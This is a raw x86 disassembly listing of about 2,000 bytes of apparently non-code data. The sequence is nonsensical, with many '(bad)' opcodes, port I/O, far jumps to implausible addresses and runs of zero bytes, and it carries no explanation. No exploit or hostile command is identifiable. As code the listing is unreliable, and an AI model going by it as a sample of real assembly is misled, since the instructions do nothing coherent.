  412324:	mov    ds:0x93a2dd36,al
  412329:	dec    esp
  41232a:	mov    esp,DWORD PTR [ecx-0x5e75407b]
  412330:	out    dx,eax
  412331:	dec    edi
  412332:	out    dx,eax
  412333:	push   0xffffffe4
  412335:	xchg   edx,eax
  412336:	jmp    FWORD PTR [ebx+edx*8+0x4b]
  41233a:	out    dx,eax
  41233b:	jle    0x41238e
  41233d:	adc    cl,BYTE PTR [esi]
  41233f:	jmp    0x35cbe2d7
  412344:	(bad)  
  412345:	dec    edi
  412346:	out    dx,eax
  412347:	and    al,0x14
  412349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41234a:	push   cs
  41234b:	jmp    0x412350
  412350:	add    BYTE PTR [esp+ebp*4-0x716ca911],ah
  412357:	push   cs
  412358:	or     DWORD PTR [edx+esi*4-0x539e9501],ecx
  41235f:	push   cs
  412360:	jmp    0xe96fdbb5
  412365:	xchg   ebx,eax
  412366:	mov    edi,0x4f875588
  41236b:	out    dx,eax
  41236c:	in     al,0xc2
  41236e:	xchg   edx,eax
  41236f:	push   cs
  412370:	jmp    0x12c65a17
  412375:	xchg   ebx,eax
  412376:	dec    esp
  412377:	xor    DWORD PTR [esi-0x9f14d4d],ebp
  41237d:	pop    ss
  41237e:	int3   
  41237f:	repz (bad) 
  412381:	xchg   edx,eax
  412382:	mov    cs,WORD PTR [esi]
  412384:	mov    ecx,0x1e5b293
  412389:	xchg   edx,eax
  41238a:	dec    esp
  41238b:	out    dx,eax
  41238c:	and    dh,BYTE PTR [ebx+0x3969ffde]
  412392:	dec    ecx
  412393:	out    dx,eax
  412394:	(bad)  
  412395:	add    BYTE PTR [ebx+ecx*1],0x2a
  412399:	cmovp  eax,DWORD PTR [eax+eax*1]
  41239d:	es aaa 
  41239f:	push   eax
  4123a0:	sti    
  4123a1:	(bad)  
  4123a2:	scas   eax,DWORD PTR es:[edi]
  4123a3:	mov    eax,?
  4123a5:	hlt    
  4123a6:	lahf   
  4123a7:	mov    bl,ah
  4123a9:	aam    0xb0
  4123ab:	push   cs
  4123ac:	cmp    eax,0xeb16c
  4123b1:	out    0x34,al
  4123b3:	(bad)  
  4123b4:	sbb    eax,0x0
  4123b9:	add    cl,bh
  4123bb:	mov    al,0x33
  4123bd:	daa    
  4123be:	fnstenv [eax-0xf90f0f2]
  4123c4:	cmc    
  4123c5:	call   DWORD PTR [esi-0xe]
  4123c8:	daa    
  4123c9:	and    BYTE PTR [ecx-0x479fe50],bh
  4123cf:	xchg   ecx,eax
  4123d0:	push   cs
  4123d1:	add    BYTE PTR [eax-0x80],ah
  4123d4:	cmc    
  4123d5:	call   DWORD PTR [esi-0x74]
  4123d8:	push   ecx
  4123d9:	ins    BYTE PTR es:[edi],dx
  4123da:	mov    dh,0x33
  4123dc:	lahf   
  4123dd:	std    
  4123de:	push   esi
  4123df:	mov    al,0x0
  4123e1:	mov    dh,0xaa
  4123e3:	repz (bad) 
  4123e5:	clc    
  4123e6:	mov    ds:0x64a78c9f,eax
  4123eb:	mov    al,0xe
  4123ed:	add    ecx,0xffffffa2
  4123f0:	add    DWORD PTR [esi-0xeb287],eax
  4123f6:	push   esp
  4123f7:	cmp    ecx,DWORD PTR [esi]
  4123f9:	add    BYTE PTR [ecx-0x5f],bh
  4123fc:	mov    al,BYTE PTR ds:0x33f0b082
  412402:	jnp    0x4123be
  412404:	(bad)  
  412405:	fist   WORD PTR [esi-0x4e]
  412408:	dec    ebx
  412409:	cmp    edi,DWORD PTR [ebx-0x60]
  41240c:	mov    DWORD PTR [ebx-0x16f14fac],eax
  412412:	pop    ecx
  412413:	dec    ebp
  412414:	icebp  
  412415:	jmp    DWORD PTR [esi]
  412417:	or     al,BYTE PTR [ebx+0x1]
  41241a:	nop
  41241b:	push   esp
  41241c:	mov    ch,0x43
  41241e:	add    BYTE PTR [eax],al
  412420:	add    BYTE PTR [eax],al
  412422:	add    BYTE PTR [edx-0x74f714e6],dl
  412428:	add    DWORD PTR [ecx],ecx
  41242a:	(bad)  
  41242b:	adc    edx,DWORD PTR [edi]
  41242d:	or     DWORD PTR [edi-0x78ed42a4],eax
  412433:	je     0x4123ea
  412435:	cmp    DWORD PTR cs:[esi+edi*2],ecx
  412439:	inc    ebx
  41243a:	push   edi
  41243c:	pop    ecx
  41243d:	jo     0x412451
  41243f:	sbb    ecx,DWORD PTR [ebp-0x307376e2]
  412445:	xchg   eax,eax
  412447:	pop    eax
  412448:	inc    ecx
  412449:	adc    BYTE PTR [edx+ecx*1+0x56],0x22
  41244e:	sar    BYTE PTR [ebx+0x58753468],1
  412454:	inc    ebp
  412455:	add    ecx,DWORD PTR [ecx+0x2476c2e6]
  41245b:	ins    BYTE PTR es:[edi],dx
  41245c:	loopne 0x41245e
  41245e:	mov    DWORD PTR [edi+0x75],eax
  412461:	and    dl,cl
  412463:	push   edx
  412464:	rcl    BYTE PTR [esi+0x24],cl
  412467:	je     0x412428
  412469:	inc    edi
  41246a:	add    BYTE PTR [eax],cl
  41246c:	push   ss
  41246d:	daa    
  41246e:	xor    esp,ecx
  412470:	sbb    ebx,DWORD PTR [esi]
  412472:	xor    BYTE PTR [ebx+0x59],0xb
  412476:	add    BYTE PTR [eax+eax*1+0x1eb44475],bh
  41247d:	push   ds
  41247e:	test   DWORD PTR [edi+0x59],eax
  412481:	or     eax,DWORD PTR [eax]
  412483:	xchg   edi,eax
  412484:	jecxz  0x4124c5
  412486:	inc    DWORD PTR [eax]
  412488:	add    BYTE PTR [eax],al
  41248a:	add    BYTE PTR [eax],al
  41248c:	mov    ds:0xac7c8a99,al
  412491:	or     BYTE PTR [eax+0xd],al
  412494:	and    al,0x99
  412496:	retf   
  412497:	fistp  WORD PTR [eax-0x5bdbb92e]
  41249d:	mov    dl,0xf8
  41249f:	mov    ecx,0xcbfcb0d3
  4124a4:	popf   
  4124a5:	add    al,0x22
  4124a7:	add    eax,0x8aed51e7
  4124ac:	aam    0x96
  4124ae:	aad    0x10
  4124b0:	fdivrp st(4),st
  4124b2:	jmp    0xd5d778c1
  4124b7:	mov    WORD PTR [esi+edx*4-0x2b],cs
  4124bb:	adc    BYTE PTR [esi+esi*8-0x3f],dl
  4124bf:	aas    
  4124c0:	adc    DWORD PTR [ebp-0x16],esi
  4124c3:	in     al,dx
  4124c4:	mov    bl,0xbb
  4124c6:	dec    edi
  4124c7:	inc    edi
  4124c8:	lods   al,BYTE PTR ds:[esi]
  4124c9:	jg     0x4124f5
  4124cb:	(bad)
  4124cf:	loop   0x4124a8
  4124d1:	cmp    DWORD PTR [ecx],esp
  4124d3:	sub    BYTE PTR [ebx+edi*4-0x4d574c9],ah
  4124da:	and    eax,0x650c8d04
  4124df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e0:	inc    ebp
  4124e1:	repnz in eax,0x86
  4124e4:	sar    BYTE PTR [edx-0x7193b85f],1
  4124ea:	outs   dx,BYTE PTR ds:[esi]
  4124eb:	inc    edi
  4124ec:	je     0x412490
  4124ee:	jle    0x41253f
  4124f0:	add    BYTE PTR [eax],al
  4124f2:	add    BYTE PTR [eax],al
  4124f4:	add    BYTE PTR [edx+ebx*4+0x7e],ch
  4124f8:	outs   dx,DWORD PTR ds:[esi]
  4124f9:	mov    ah,0xa6
  4124fb:	(bad)  
  4124fc:	aad    0x95
  4124fe:	cs dec ebp
  412500:	out    dx,al
  412501:	jge    0x41254d
  412503:	aam    0xc3
  412505:	sar    BYTE PTR [ebx],1
  412507:	test   eax,0x2d8db027
  41250c:	jg     0x4124af
  41250e:	dec    ecx
  41250f:	pop    ecx
  412510:	daa    
  412511:	shl    BYTE PTR [ebx-0x8f6fc1b],0xc9
  412518:	pop    ds
  412519:	in     eax,0xe4
  41251b:	push   cs
  41251c:	bound  ebx,QWORD PTR [ebx+ebx*2-0x2]
  412520:	std    
  412521:	aas    
  412522:	dec    eax
  412523:	mov    DWORD PTR [ecx-0x59fd179],ebp
  412529:	xchg   ebx,eax
  41252a:	mov    dl,0x83
  41252c:	cmp    eax,0x25838e78
  412531:	push   0x68358392
  412536:	call   0xd4a:0x3154a30b
  41253d:	lods   al,BYTE PTR ds:[esi]
  41253e:	mov    ecx,ebp
  412540:	das    
  412541:	loope  0x41257e
  412543:	dec    edx
  412544:	int    0xa3
  412546:	mov    eax,esi
  412548:	out    dx,al
  412549:	pop    ss
  41254a:	sub    ecx,esp
  41254c:	xchg   esi,eax
  41254d:	out    0x33,eax
  41254f:	jb     0x412516
  412551:	xchg   DWORD PTR [edx-0x5af19301],esi
  412557:	push   cs
  412558:	jmp    0x41255d
  41255d:	add    BYTE PTR [edx],bl
  41255f:	das    
  412560:	sub    dl,BYTE PTR ds:0x290eb28d
  412566:	lods   eax,DWORD PTR ds:[esi]
  412567:	mov    DWORD PTR [ecx+ebp*8],ebx
  41256a:	xchg   ebx,eax
  41256b:	inc    edi
  41256c:	mov    edx,0xef494405
  412571:	jmp    0x3ac509b4
  412576:	lods   al,BYTE PTR ds:[esi]
  412577:	sub    eax,0x359746e2
  41257c:	into   
  41257d:	out    dx,al
  41257e:	pop    ss
  41257f:	stos   DWORD PTR es:[edi],eax
  412580:	sbb    ebp,ecx
  412582:	xchg   ebx,eax
  412583:	mov    bl,0x52
  412585:	add    eax,0x146951a8
  41258a:	ja     0x4125d3
  41258c:	and    DWORD PTR [esp+edx*4+0x14c8c933],0x9f12aee
  412597:	std    
  412598:	push   cs
  412599:	add    bl,ah
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	xchg   DWORD PTR [ebp+edx*2-0x57],ebp
  4125a0:	xor    al,BYTE PTR [esi+0x2e]
  4125a3:	xor    ecx,DWORD PTR [ebp+0x32b52900]
  4125a9:	dec    ebx
  4125aa:	xlat   BYTE PTR ds:[ebx]
  4125ab:	lock xor cl,BYTE PTR [ebp-0x3a]
  4125af:	int    0x1
  4125b1:	mov    dh,0x64
  4125b3:	mov    ch,0x3d
  4125b5:	shr    BYTE PTR [ecx-0x68f0bcba],0xe2
  4125bc:	out    dx,eax
  4125bd:	push   cs
  4125be:	gs jne 0x412570
  4125c1:	loope  0x4125c3
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	icebp  
  4125c8:	ins    DWORD PTR es:[edi],dx
  4125c9:	in     al,dx
  4125ca:	or     BYTE PTR [eax-0xf],dh
  4125cd:	sub    ah,BYTE PTR [esi+edi*8]
  4125d0:	dec    BYTE PTR [edx+0x2]
  4125d3:	loop   0x412651
  4125d5:	add    DWORD PTR [esi-0x2ffa454c],esi
  4125db:	inc    ecx
  4125dc:	dec    eax
  4125dd:	icebp  
  4125de:	dec    DWORD PTR [esi+0x40d04ab9]
  4125e4:	loope  0x412610
  4125e6:	sub    BYTE PTR [edx],bh
  4125e8:	jp     0x4125f5
  4125ea:	xor    ebx,DWORD PTR [ebx]
  4125ec:	ss inc edx
  4125ee:	and    al,0xb9
  4125f0:	xor    eax,0xf2ad2462
  4125f5:	in     eax,0x46
  4125f7:	scas   al,BYTE PTR es:[edi]
  4125f8:	(bad)  
  4125f9:	scas   al,BYTE PTR es:[edi]
  4125fa:	xor    ebx,DWORD PTR [ebx+0x22]
  4125fd:	inc    esi
  4125fe:	mov    edx,0x89c493eb
  412603:	cmp    eax,0xff0f2a90
  412608:	cmp    edx,DWORD PTR [edi+ecx*2-0x41fe4bd7]
  41260f:	jmp    0x79816725
  412614:	sti    
  412615:	xchg   DWORD PTR [eax+edx*4+0x75],ebp
  412619:	ja     0x875c93eb
  41261f:	int3   
  412620:	jne    0x412645
  412622:	adc    DWORD PTR [eax-0x41],0x13
  412626:	mov    eax,0x7df14147
  41262b:	add    BYTE PTR [eax],al
  41262d:	add    BYTE PTR [eax],al
  41262f:	add    BYTE PTR [ecx],cl
  412631:	push   cs
  412632:	daa    
  412633:	sub    BYTE PTR [ebx],ch
  412635:	aas    
  412636:	ds rcl dl,cl
  412639:	ret    0x2456
  41263c:	js     0x412612
  41263e:	les    eax,FWORD PTR [edi-0x78e5523c]
  412644:	mov    esp,0xda392ab5
  412649:	test   DWORD PTR [edx],esi
  41264b:	cmp    DWORD PTR [edi-0x13],esp
  41264e:	add    DWORD PTR [ecx+0xb6b85],eax
  412654:	xchg   edi,esp
  412656:	sbb    eax,0xc4c4d031
  41265b:	xor    ecx,0xf0d14b58
  412661:	aam    0x5e
  412663:	and    al,0x78
  412665:	sbb    ah,ah
  412667:	add    DWORD PTR [ebx-0x33],edx
  41266a:	push   es
  41266b:	or     dl,BYTE PTR [edi-0x6fe6b82b]
  412671:	pop    ecx
  412672:	xchg   BYTE PTR [esp+ebp*2-0x47],al
  412676:	test   DWORD PTR [esp+esi*2+0x49],ecx
  41267a:	dec    ebx
  41267b:	xchg   DWORD PTR [ebp+esi*4+0x2a],ecx
  41267f:	cmp    ecx,edx
  412681:	ja     0x412646
  412683:	mov    DWORD PTR [ebp+esi*4+0x22],ecx
  412687:	cmp    DWORD PTR [eax+0x58],ebx
  41268a:	xchg   DWORD PTR [esi+0x74],ebp
  41268d:	xor    cl,0x81
  412690:	cld    
  412691:	lods   eax,DWORD PTR ds:[esi]
  412692:	add    BYTE PTR es:[eax],al
  412695:	add    BYTE PTR [eax],al
  412697:	add    BYTE PTR [eax],al
  412699:	xchg   DWORD PTR [edx-0x4d7d4b9f],esi
  41269f:	in     eax,0x88
  4126a1:	or     al,0x8e
  4126a3:	mov    ecx,0xa5b29002
  4126a8:	jmp    0xef19:0x3e5a4e9
  4126af:	xor    DWORD PTR [eax],0x42249b62
  4126b5:	jns    0x41272b
  4126b7:	ror    BYTE PTR [edi+0x3e5a3ce],1
  4126bd:	sbb    dh,BYTE PTR [ebx-0x4e2cc3dc]
  4126c3:	call   0xe5ed4b4e
  4126c8:	add    ebp,DWORD PTR [edi]
  4126ca:	xlat   BYTE PTR ds:[ebx]
  4126cb:	mov    dh,0xfc
  4126cd:	or     eax,0xc170283b
  4126d2:	fs or  al,0xc1
  4126d5:	push   edx
  4126d6:	mov    esp,DWORD PTR [ebx-0xb72fbf4]
  4126dc:	add    edx,DWORD PTR [eax+0x190057b7]
  4126e2:	(bad)  
  4126e4:	or     al,0x26
  4126e6:	cmc    
  4126e7:	out    0x89,al
  4126e9:	mov    WORD PTR [edx-0x5e6bc3dc],fs
  4126ef:	loopne 0x412677
  4126f1:	fsubr  DWORD PTR [ebx-0x4bd5fc1b]
  4126f7:	sbb    eax,0xae58a801
  4126fc:	icebp  
  4126fd:	add    BYTE PTR [eax],al
  4126ff:	add    BYTE PTR [eax],al
  412701:	add    BYTE PTR [ebp+0x43b5e046],ch
  412707:	mov    cl,0xe8
  412709:	mov    ch,0x53
  41270b:	mov    ah,0x26
  41270d:	loope  0x412697
  41270f:	mov    ebx,0x325a8815
  412714:	sub    al,BYTE PTR [eax]
  412716:	jns    0x4126ed
  412718:	push   cs
  412719:	cli    
  41271a:	push   ebx
  41271b:	repz test DWORD PTR [ebp+0x5eff9aaf],esp
  412722:	mov    BYTE PTR [ebp+0x0],0x57
  412726:	into   
  412727:	mov    al,0xcd
  412729:	or     ecx,DWORD PTR [ebx+0x53dadebb]
  41272f:	xor    esi,DWORD PTR [edx-0x33]
  412732:	or     BYTE PTR [ebx+eax*4-0x31e16bd1],0x60
  41273a:	xlat   BYTE PTR ds:[ebx]
  41273b:	mov    gs,WORD PTR [edx]
  41273d:	add    bl,BYTE PTR [esi-0x7c]
  412740:	into   
  412741:	sub    DWORD PTR [edi],ebx
  412743:	jne    0x4126f9
  412745:	fisubr WORD PTR [ebx]
  412747:	dec    eax
  412748:	outs   dx,DWORD PTR ds:[esi]
  412749:	pusha  
  41274a:	ror    BYTE PTR [esi-0x7fd8dbda],1
  412750:	cmp    ebp,DWORD PTR [ecx-0x2d39c4ac]
  412756:	stc    
  412757:	or     esi,0x29
  41275a:	pcmpeqw mm0,QWORD PTR [ebx-0x7eb21867]
  412761:	sub    esi,ebp
  412763:	sbb    esp,0x2b
  412766:	add    BYTE PTR [eax],al
  412768:	add    BYTE PTR [eax],al
  41276a:	add    BYTE PTR [edi],dl
  41276c:	jnp    0x412799
  41276e:	mov    ds:0x819e048b,eax
  412773:	dec    ebx
  412774:	repnz push cs
  412776:	jo     0x4127d0
  412778:	mov    gs,WORD PTR [edx]
  41277a:	out    dx,al
  41277b:	or     DWORD PTR [ebx],edi
  41277d:	out    dx,al
  41277e:	es push esp
  412780:	mov    dl,0x49
  412782:	fimul  WORD PTR fs:[edx]
  412785:	out    dx,eax
  412786:	stos   WORD PTR es:[edi],ax
  412788:	(bad)  
  412789:	jmp    DWORD PTR [ebx+eax*8-0x6c534749]
  412790:	icebp  
  412791:	clc    
  412792:	gs jo  0x412777
  412795:	or     eax,0xefb17900
  41279a:	mov    BYTE PTR ds:0x35891ea5,bl
  4127a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a1:	push   ss
  4127a2:	mov    DWORD PTR ds:0x5892ea5,ebp
  4127a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a9:	adc    cl,BYTE PTR [edi]
  4127ab:	in     eax,dx
  4127ac:	xchg   bh,ch
  4127ae:	jmp    FWORD PTR [ecx+0x34]
  4127b1:	pop    ecx
  4127b2:	xor    al,dh
  4127b4:	loop   0x4127e0
  4127b6:	adc    al,0x46
  4127b8:	add    ecx,DWORD PTR [edx]
  4127ba:	adc    dl,al
  4127bc:	loop   0x4127e8
  4127be:	adc    BYTE PTR [eax-0x5dfd50e],dh
  4127c4:	jo     0x412814
  4127c6:	mov    DWORD PTR [ebp-0x6e],edi
  4127c9:	and    bh,BYTE PTR [ebx]
  4127cb:	loope  0x412789
  4127cd:	cmp    eax,0x3b
  4127d2:	add    BYTE PTR [eax],al
  4127d4:	data16 fiadd DWORD PTR [ecx]
  4127d7:	sub    DWORD PTR ds:0x6000e9e,0x3
  4127de:	or     eax,0x1a92c58b
  4127e3:	inc    ebx
  4127e4:	test   BYTE PTR [edx],0xa
  4127e7:	cmp    BYTE PTR [edx-0x3],dh
  4127ea:	sub    DWORD PTR [eax+edi*8-0x50],ecx
  4127ee:	push   cs
  4127ef:	cmp    DWORD PTR [ebp+0x6c0f2e92],ebp
  4127f5:	bound  edx,QWORD PTR [edi]
  4127f7:	add    cl,ch
  4127f9:	xor    ecx,DWORD PTR [edx+0x24]
  4127fc:	in     eax,0xf0
  4127fe:	xchg   DWORD PTR [ebp+ecx*8-0x74],eax
  412802:	xor    eax,0x3579c7c1
  412807:	retf   0xc4d6
  41280a:	or     bl,ch
  41280c:	ss dec eax
  41280e:	lea    edi,[ebp+ecx*4-0x6e]
  412812:	push   cs
  412813:	seto   dh
  412816:	adc    edx,DWORD PTR [edx]
  412818:	nop
  412819:	pop    ebx
  41281a:	add    cl,0x19
  41281d:	push   ss
  41281e:	mov    ebx,tr1
  412821:	jg     0x412827
  412823:	mov    edi,DWORD PTR [edx]
  412825:	pop    edx
  412826:	or     eax,DWORD PTR [eax]
  412828:	mov    ebx,0x130d6734
  41282d:	mov    esi,0x5490000b
  412832:	mov    ebp,0x3b050b01
  412837:	or     eax,0x0
  41283c:	add    BYTE PTR [esi],bl
  41283e:	dec    esi
  41283f:	sbb    ecx,DWORD PTR [ecx+0x371b75e4]
  412845:	int3   
  412846:	ins    DWORD PTR es:[edi],dx
  412847:	sub    esi,DWORD PTR [ebx-0x6a]
  41284a:	sbb    BYTE PTR [edx+0x39],cl
  41284d:	dec    edx
  41284e:	(bad)  
  41284f:	(bad)  
  412850:	mov    DWORD PTR [esi+esi*4],ebx
  412853:	dec    edx
  412854:	jmp    DWORD PTR [edi]
  412856:	pop    edx
  412857:	add    BYTE PTR [esp+esi*2-0x4b],0x89
  41285c:	jl     0x4128ca
  41285e:	mov    cl,0xa
  412860:	or     eax,0xfde03115
  412865:	pop    es
  412866:	mov    cl,0xd2
  412868:	or     eax,0x13f412
  41286d:	nop
  41286e:	ror    BYTE PTR [esi+0xb5a4c24],1
  412874:	add    BYTE PTR [eax-0x3e],dl
  412877:	dec    esi
  412878:	and    al,0xa4
  41287a:	mov    DWORD PTR [ebp+edi*8+0x1c],ebx
  41287e:	outs   dx,BYTE PTR ds:[esi]
  41287f:	push   edi
  412880:	dec    edi
  412882:	pop    ecx
  412883:	adc    bl,0xc7
  412886:	jge    0x4128b6
  412888:	pop    esp
  412889:	xchg   ecx,eax
  41288a:	pop    ecx
  41288b:	or     edx,DWORD PTR [ebp-0x49]
  41288e:	jge    0x4128be
  412890:	pop    esp
  412891:	xchg   ecx,eax
  412892:	mov    dl,0xe5
  412894:	add    esp,DWORD PTR [ebp-0x60a7f702]
  41289a:	inc    ebx
  41289b:	in     eax,0x52
  41289d:	or     DWORD PTR [eax+0x4d],edi
  4128a0:	add    al,0x0
  4128a2:	add    BYTE PTR [eax],al
  4128a4:	add    BYTE PTR [eax],al
  4128a6:	jp     0x4128eb
  4128a8:	dec    eax
  4128a9:	dec    ebp
  4128aa:	adc    esi,DWORD PTR [edx-0x20]
  4128ad:	jle    0x412839
  4128af:	mov    ah,0xe5
  4128b1:	add    ecx,DWORD PTR [ecx]
  4128b3:	or     DWORD PTR ss:[edi+ebp*2+0x43],eax
  4128b8:	in     eax,0x8c
  4128ba:	int3   
  4128bb:	mov    ds,ecx
  4128bd:	cmp    al,0xbc
  4128bf:	mov    es,ecx
  4128c1:	je     0x4128de
  4128c3:	pop    ecx
  4128c4:	repz sbb dl,BYTE PTR [eax-0x3b869b4e]
  4128cb:	mov    dl,0x7c
  4128cd:	mov    BYTE PTR [edx+esi*8-0x1a],dh
  4128d1:	add    edx,DWORD PTR [eax+0x473d6dbe]
  4128d7:	mov    esp,0xf2503461
  4128dc:	jle    0x41291e
  4128de:	mov    esp,0x85782089
  4128e3:	xor    al,0x5a
  4128e5:	stc    
  4128e6:	or     eax,0x8acde43
  4128eb:	inc    ebx
  4128ec:	mov    al,0x8c
  4128ee:	or     al,0x8e
  4128f0:	and    eax,0xceb29003
  4128f5:	imul   ebp,ebp,0x42
  4128f8:	test   al,0x34
  4128fa:	shl    cl,1
  4128fc:	jle    0x41293d
  4128fe:	mov    ah,0x96
  412900:	fmul   st(3),st
  412902:	push   esp
  412903:	mov    ds,esp
  412905:	pop    eax
  412906:	cmp    al,0xb3
  412908:	fadd   DWORD PTR fs:[eax]
  41290b:	add    BYTE PTR [eax],al
  41290d:	add    BYTE PTR [eax],al
  41290f:	xchg   ebp,eax
  412910:	mov    dl,0xe5
  412912:	or     BYTE PTR [esi],al
  412914:	scas   eax,DWORD PTR es:[edi]
  412915:	push   cs
  412916:	sub    bh,BYTE PTR [ebx-0x12]
  412919:	sub    cl,cl
  41291b:	cwde   
  41291c:	das    
  41291d:	scas   eax,DWORD PTR es:[edi]
  41291e:	add    DWORD PTR [edx+esi*4-0x69805a7d],ecx
  412925:	dec    esi
  412926:	pusha  
  412927:	push   edi
  412928:	mov    fs,WORD PTR [edx]
  41292a:	adc    dl,BYTE PTR [ebx-0x3f]
  41292d:	rol    BYTE PTR [edx],cl
  41292f:	push   esi
  412930:	mov    al,0x8a
  412932:	cmp    DWORD PTR [edx+0x40],ebp
  412935:	out    dx,eax
  412936:	push   0xffffffff
  412938:	xchg   esi,eax
  412939:	sub    ch,cl
  41293b:	cwde   
  41293c:	xor    eax,0xb293f871
  412941:	sub    DWORD PTR [edx],0xa
  412944:	imul   DWORD PTR [edx]
  412946:	stc    
  412947:	xchg   esp,eax
  412948:	ins    BYTE PTR es:[edi],dx
  412949:	call   FWORD PTR [ebx-0x8]
  41294c:	mov    dl,0xe
  41294e:	jmp    0xeea408d7
  412953:	adc    al,0xc2
  412955:	push   cs
  412956:	jmp    0xeaf9d8ee
  41295b:	push   0xfffffff6
  41295d:	sub    cl,BYTE PTR [ecx]
  41295f:	mov    eax,ds:0x5b284bb8
  412964:	ins    BYTE PTR es:[edi],dx
  412965:	jb     0x412928
  412967:	or     ebp,DWORD PTR [edi]
  412969:	sub    ch,BYTE PTR [ecx]
  41296b:	xchg   ebp,eax
  41296c:	mov    dl,0xe
  41296e:	jb     0x4129c0
  412970:	xchg   esi,eax
  412971:	push   ds
  412972:	push   0x0
  412974:	add    BYTE PTR [eax],al
  412976:	add    BYTE PTR [eax],al
  412978:	js     0x412910
  41297a:	es jmp 0xc0ff5f0e
  412980:	out    0x3f,eax
  412982:	xor    eax,ecx
  412984:	(bad)  
  412985:	xor    al,0x53
  412987:	add    DWORD PTR [edx+esi*4-0x214f927d],edx
  41298e:	or     eax,0x85f293e9
  412993:	add    BYTE PTR [ebp-0x6e],dh
  412996:	cmp    dl,BYTE PTR [eax-0x59]
  412999:	dec    ecx
  41299a:	mov    edx,0xeb79d24
  41299f:	add    BYTE PTR [edx],dh
  4129a1:	arpl   cx,si
  4129a3:	mov    ah,0x95
  4129a5:	(bad)  
  4129a7:	jmp    FWORD PTR [ecx-0x7a4b0e10]
  4129ad:	(bad)  
  4129af:	(bad)  
  4129b0:	jns    0x4129fa
  4129b2:	mov    edx,0xeb62d24
  4129b7:	add    BYTE PTR [eax],bl
  4129b9:	sub    al,0xc5
  4129bb:	call   0x327874
  4129c0:	xor    dh,BYTE PTR [edx]
  4129c2:	into   
  4129c3:	pmuludq mm1,QWORD PTR [ecx+0x2]
  4129c7:	add    BYTE PTR [ecx+0x2c],ch
  4129ca:	and    BYTE PTR [ecx+ebp*1],0xb6
  4129ce:	push   cs
  4129cf:	add    BYTE PTR [edx+0x52342af2],dh
  4129d5:	jmp    0xfafb3a04
  4129da:	out    0x7,al
  4129dc:	add    BYTE PTR [eax],al
  4129de:	add    BYTE PTR [eax],al
  4129e0:	add    BYTE PTR [ecx-0x4b],ah
  4129e3:	push   cs
  4129e4:	cmp    DWORD PTR [esi-0x6274f137],0xffffffa1
  4129eb:	dec    esi
  4129ec:	add    DWORD PTR [ecx],ebp
  4129ee:	mov    ch,0x7a
  4129f0:	mov    BYTE PTR [edx-0x557b87a1],al
  4129f6:	jbe    0x412a46
  4129f8:	mov    DWORD PTR [esi-0x42b8c826],esi
  4129fe:	mov    ecx,0x483e7580
  412a03:	icebp  
  412a04:	jmp    0x327a22
  412a09:	bound  edi,QWORD PTR [ecx]
  412a0b:	sub    al,BYTE PTR [eax-0x18]
  412a0e:	mov    ah,0xe
  412a10:	jmp    0xfe38dda5
  412a15:	iret   
  412a16:	arpl   WORD PTR [eax+0x6c],bx
  412a19:	xchg   edi,eax
  412a1a:	int3   
  412a1b:	(bad)
  412a1e:	mov    edi,0xfc93b608
  412a23:	fadd   QWORD PTR [edx+0x53]
  412a26:	shr    BYTE PTR [edi],cl
  412a28:	and    al,0x7c
  412a2a:	iret   
  412a2b:	jg     0x412a51
  412a2d:	inc    eax
  412a2e:	dec    edx
  412a2f:	or     eax,DWORD PTR [eax]
  412a31:	sbb    al,0x48
  412a33:	test   BYTE PTR [ebp-0x40],dl
  412a36:	pusha  
  412a37:	mov    eax,ds:0xefc3914b
  412a3c:	movlps QWORD PTR [edi-0x521b78f3],xmm2
  412a43:	push   ss
  412a44:	cmp    BYTE PTR [eax],al
  412a46:	add    BYTE PTR [eax],al
  412a48:	add    BYTE PTR [eax],al
  412a4a:	xchg   esp,eax
  412a4b:	pop    edx
  412a4c:	or     BYTE PTR [edi+eax*1+0x69000b41],al
  412a53:	stos   BYTE PTR es:[edi],al
  412a54:	jecxz  0x412a53
  412a56:	push   edi
  412a57:	pop    ecx
  412a58:	mov    eax,ds:0xcecc9143
  412a5d:	add    bl,BYTE PTR [ecx]
  412a5f:	nop    DWORD PTR es:[ebx+0x15]
  412a64:	unpcklps xmm0,XMMWORD PTR [edi+0x2fe8ddce]
  412a6b:	push   ecx
  412a6c:	jecxz  0x4129ee
  412a6e:	jg     0x412ab9
  412a70:	or     ecx,DWORD PTR ds:0xd0b86e6
  412a76:	fimul  WORD PTR [esi+0x51f2bf0c]
  412a7c:	push   es
  412a7d:	rcr    BYTE PTR [ebx],1
  412a7f:	add    al,0x8d
  412a81:	ret    
  412a82:	xchg   ebx,eax
  412a83:	fs jns 0x412a93
  412a86:	ds lahf 
  412a88:	or     ecx,DWORD PTR ds:0xbf0c9726
  412a8e:	repnz mov dl,0xfd
  412a91:	or     al,al
  412a93:	and    DWORD PTR [ebp-0x2b69ab7c],0x30
  412a9a:	sbb    DWORD PTR [ecx-0x30],esi
  412a9d:	(bad)  
  412a9e:	shr    BYTE PTR [ecx],1
  412aa0:	and    DWORD PTR [eax],esp
  412aa2:	je     0x412aef
  412aa4:	xchg   ecx,eax
  412aa5:	xor    eax,edx
  412aa7:	repnz ins BYTE PTR es:[edi],dx
  412aa9:	(bad)  
  412aaa:	jmp    0x0:0xf5603f
  412ab1:	add    BYTE PTR [eax],al
  412ab3:	and    eax,0x681fa129
  412ab8:	cmc    
  412ab9:	pop    esp
  412aba:	inc    ebp
  412abb:	popa   
  412abc:	jb     0x412a63
  412abe:	mov    BYTE PTR [eax+0x4b],bl
  412ac1:	xor    dh,BYTE PTR [ecx]
  412ac3:	push   eax
  412ac4:	bnd jl 0x412a8d
  412ac7:	or     DWORD PTR [edx+0x5c],esp
  412aca:	jmp    0x412a51
  412acc:	or     BYTE PTR [edx-0x5a8d5efe],dl
  412ad2:	mov    cl,ah
  412ad4:	xchg   esi,eax
  412ad5:	fld    QWORD PTR [esi+eiz*1]
  412ad8:	cmc    
  412ad9:	jecxz  0x412a9d
  412adb:	jb     0x412a87
  412add:	ins    BYTE PTR es:[edi],dx
  412ade:	(bad)  
  412adf:	cdq    
  412ae0:	bound  ecx,QWORD PTR [ecx+eiz*4]
  412ae3:	sbb    esi,esp
  412ae5:	adc    DWORD PTR [ecx],esi
  412ae7:	(bad)  
  412ae8:	hlt    
